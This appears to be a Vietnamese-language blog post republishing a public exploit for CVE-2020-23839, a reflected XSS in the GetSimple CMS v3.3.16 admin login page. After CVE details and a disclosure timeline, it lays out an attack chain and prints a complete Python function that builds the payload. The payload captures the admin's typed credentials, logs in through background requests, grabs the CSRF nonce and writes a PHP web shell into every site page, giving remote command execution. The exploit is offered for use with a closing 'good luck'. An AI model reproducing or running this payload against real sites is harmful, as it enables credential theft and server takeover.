---
title: CVE-2020-23839 
date: 20/6/2021
layout: single
header:
  teaser: /assets/images/cve.PNG
--- 



# CVE-2020-23839 | GetSimple CMS v3.3.16 - Reflected XSS to RC
Tác giả: Bobby Cooke (boku) 
[boku7/CVE-2020-23839](https://github.com/boku7/CVE-2020-23839)

+ OWASP Top Ten 2017: A7:2017-Cross-Site Scripting (XSS)
+ CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') - Type 1: Reflected XSS 
+ CVSS Base Score: 6.1 MEDIUM
+ CVSS v3.1 Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+ [https://nvd.nist.gov/vuln/detail/CVE-2020-23839](https://nvd.nist.gov/vuln/detail/CVE-2020-23839)
+ [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-23839](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-23839)

## Phân tích lỗ hổng và công bố đầy đủ vấn đề
+ [GetSimpleCMS/issues/1330](https://github.com/GetSimpleCMS/GetSimpleCMS/issues/1330)



## Mô tả lỗ hổng bảo mật
+ GetSimple CMS v3.3.16 gặp phải XSS được phản ánh trên Cổng thông tin đăng nhập quản trị viên. Vào ngày 12 tháng 8 năm 2020, nhà cung cấp đã nhận được chi tiết tiết lộ đầy đủ về lỗ hổng bảo mật thông qua email riêng tư. Lỗ hổng bảo mật đã được tiết lộ công khai vào ngày 13 tháng 9 năm 2020 thông qua MITER với việc xuất bản CVE-2020-23839, chứa rất ít chi tiết và không có bằng chứng về khái niệm. Vào ngày 20 tháng 1 năm 2021, việc tiết lộ đầy đủ và phân tích mã đã được tiết lộ công khai dưới vé các vấn đề hoạt động của GetSimple CMS GitHub.

## Mô tả Khai thác
+ Khai thác này tạo ra một trọng tải XSS được phản ánh, ở dạng siêu liên kết, khai thác CVE-2020-23839. Khi Quản trị viên của hệ thống GetSimple CMS truy cập URL này trong trình duyệt của họ và nhập thông tin đăng nhập của họ, một chuỗi tấn công khai thác tinh vi sẽ được khởi chạy, cho phép kẻ tấn công từ xa giành được Quyền thực thi mã từ xa của máy chủ lưu trữ hệ thống GetSimple CMS


## Chuỗi tấn công

1. Thủ thuật của kẻ tấn công GetSimple CMS Admin để truy cập URL được cung cấp từ khai thác này
2. Quản trị viên sau đó nhập thông tin đăng nhập của họ vào cổng đăng nhập GetSimple CMS
3. Tải trọng XSS được phản ánh sẽ kích hoạt Hành động khi Quản trị viên nhấp vào nút Gửi hoặc nhấn Enter
4. Tải trọng XSS thực hiện yêu cầu XHR POST trong nền, đăng nhập trình duyệt vào bảng quản trị GetSimple CMS
5. Sau đó, trọng tải XSS thực hiện yêu cầu XHR GET thứ hai tới admin / edit-theme.php và thu thập Mã thông báo CSRF & chủ đề đã định cấu hình cho các trang web được lưu trữ trên CMS
6. Tải trọng XSS sau đó thực hiện yêu cầu ĐĂNG XHR thứ 3 tới admin / edit-theme.php, đưa một WebShell backdoor PHP vào tất cả các trang của CMS
7. Kẻ khai thác liên tục cố gắng kết nối với trang /index.php công khai của hệ thống CMS GetSimple đích cho đến khi một WebShell được trả về
8. Khi khai thác kết nối với WebShell, một WebShell PHP tương tác xuất hiện trong bảng điều khiển kẻ tấn công




[![Language](https://img.shields.io/badge/Lang-python-blue.svg)](https://www.python.org)

## XSS_PAYLOAD

```python
def genXssPayload():
    XSS_PAYLOAD = '/index/javascript:'
    XSS_PAYLOAD += 'var s = decodeURIComponent("%2f");'
    XSS_PAYLOAD += 'var h = "application"+s+"x-www-form-urlencoded";'
    XSS_PAYLOAD += 'var e=function(i){return encodeURIComponent(i);};'
    XSS_PAYLOAD += 'var user = document.forms[0][0].value;'
    XSS_PAYLOAD += 'var pass = document.forms[0][1].value;'
    XSS_PAYLOAD += 'var u1 = s+"admin"+s;'
    XSS_PAYLOAD += 'var u2 = u1+"theme-edit.php";'
    XSS_PAYLOAD += 'var xhr1 = new XMLHttpRequest();'
    XSS_PAYLOAD += 'var xhr2 = new XMLHttpRequest();'
    XSS_PAYLOAD += 'var xhr3 = new XMLHttpRequest();'
    XSS_PAYLOAD += 'xhr1.open("POST",u1,true);'
    XSS_PAYLOAD += 'xhr1.setRequestHeader("Content-Type", h);'
    XSS_PAYLOAD += 'params = "userid="+user+"&pwd="+pass+"&submitted=Login";'
    XSS_PAYLOAD += 'xhr1.onreadystatechange = function(){'
    XSS_PAYLOAD += 'if (xhr1.readyState == 4 && xhr1.status == 200) {'
    XSS_PAYLOAD += 'xhr2.onreadystatechange = function(){'
    XSS_PAYLOAD += 'if (xhr2.readyState == 4 && xhr2.status == 200) {'
    XSS_PAYLOAD += 'r=this.responseXML;'
    XSS_PAYLOAD += 'nVal = r.querySelector("#nonce").value;'
    XSS_PAYLOAD += 'eVal = r.forms[1][2].defaultValue;'
    XSS_PAYLOAD += 'xhr3.open("POST",u2,true);'
    XSS_PAYLOAD += 'xhr3.setRequestHeader("Content-Type", h);'
    XSS_PAYLOAD += 'payload=e("<?php echo shell_exec($_REQUEST[FierceGodKick]) ?>");'
    XSS_PAYLOAD += 'params="nonce="+nVal+"&content="+payload+"&edited_file="+eVal+"&submitsave=Save+Changes";'
    XSS_PAYLOAD += 'xhr3.send(params);'
    XSS_PAYLOAD += '}};'
    XSS_PAYLOAD += 'xhr2.open("GET",u2,true);'
    XSS_PAYLOAD += 'xhr2.responseType="document";'
    XSS_PAYLOAD += 'xhr2.send();'
    XSS_PAYLOAD += '}};'
    XSS_PAYLOAD += 'xhr1.send(params);'
    XSS_PAYLOAD += '%2f%2f'
    return XSS_PAYLOAD
```
![](https://raw.githubusercontent.com/boku7/CVE-2020-23839/main/CVE202023839.png)

## Nguồn bài viết và mã khai thác được tác giả Boku7 chia sẻ  

## Chúc May Mắn :D
